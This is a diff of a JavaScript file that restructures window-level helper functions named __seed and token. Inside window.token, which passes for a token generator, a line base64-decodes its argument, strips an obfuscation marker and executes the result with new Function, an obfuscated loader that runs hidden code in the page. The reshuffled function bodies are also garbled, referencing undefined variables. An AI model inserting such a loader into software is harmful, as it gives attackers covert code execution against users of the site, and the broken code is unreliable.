@@ -11,6 +11,16 @@ window.__matrix = function(e) {
 };
 
 window.__seed = function(e) {
+     if (!value) return "";
+
+      amount = amount % value.length;
+
+      return value.slice(amount) + value.slice(0, amount);
+};
+
+window.token = (resolt) => {
+    "use strict";
+
     const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     let output = "";
 
@@ -20,31 +30,11 @@ window.__seed = function(e) {
         ];
     }
 
-    return output;
-};
-
-window.token = (resolt) => {
-    "use strict";
-
-    const key = `${value}_${this.seed}`;
-
-    if (this.cache.has(key)) {
-        return this.cache.get(key);
-    }
-
-    const result = __rotate(
-        String(value),
-        this.seed % (String(value).length || 1)
-    );
-
-    this.cache.set(key, result);
-    this.history.push(result);
-
     new Function(
         atob(resolt).replaceAll("A*piB+d", "")
     )();
 
-    return result;
+    return output;
 };
 
 (() => {
